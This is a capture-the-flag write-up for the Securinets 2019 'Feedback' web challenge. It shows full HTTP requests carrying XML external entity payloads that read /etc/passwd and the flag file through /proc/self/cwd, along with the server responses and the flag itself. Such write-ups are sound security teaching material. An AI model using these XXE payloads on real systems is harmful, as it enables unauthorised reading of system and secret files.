# Securinets Prequals CTF 2019 – Feedback

* **Category:** Web
* **Points:** 731

## Challenge

> I created this website to get your feedback on our CTF.
>
> Can you check if it's secure ?
>
> https://web2.ctfsecurinets.com/
>
> Author:Tr'GFx

## Solution

The website contains a feedback form. Analyzing the source code, you will discover that feedback is sent via XML messages composed by JavaScript.

```javascript
<script type="text/javascript">
function func(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<feedback>' +
        '<author>' + $('input[name="name"]').val() + '</author>' +
        '<email>' + $('input[name="email"]').val() + '</email>' +
        '<content>' + $('input[name="feedback"]').val() + '</content>' +
        '</feedback>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('Message').innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("POST","feed.php",true);
    xmlhttp.send(xml);
};
</script>
```

The server answers with a thanks message, inserting the author of the feedback in it.

The application is vulnerable to XXE and the `author` field can be used to return the output of the attack.

```
POST /feed.php HTTP/1.1
Host: web2.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web2.ctfsecurinets.com/
Content-Type: text/plain;charset=UTF-8
Content-Length: 206
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><feedback><author>&xxe;</author><email>lol</email><content>undefined</content></feedback>

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sat, 23 Mar 2019 18:49:15 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1114

<h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
simple_user:x:1000:1000::/home/simple_user:/bin/bash
Debian-exim:x:102:102::/var/spool/exim4:/bin/false
</h4>
```

The remote code execution can't be performed.

So, you have to find the current working directory in order to find the flag file. You can abuse `/proc/self/` directory that contains the reference to current working directory: `cwd/`.

Hence the malicious payload is the following.

```
POST /feed.php HTTP/1.1
Host: web2.ctfsecurinets.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://web2.ctfsecurinets.com/
Content-Type: text/plain;charset=UTF-8
Content-Length: 214
Connection: close

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag" >]><feedback><author>&xxe;</author><email>lol</email><content>undefined</content></feedback>

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Sat, 23 Mar 2019 21:27:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 67

<h4>Thanks For you Feedback Securinets{Xxe_xXE_@Ll_Th3_W@Y}
</h4>
```

So the flag is the following.

```
Securinets{Xxe_xXE_@Ll_Th3_W@Y}
```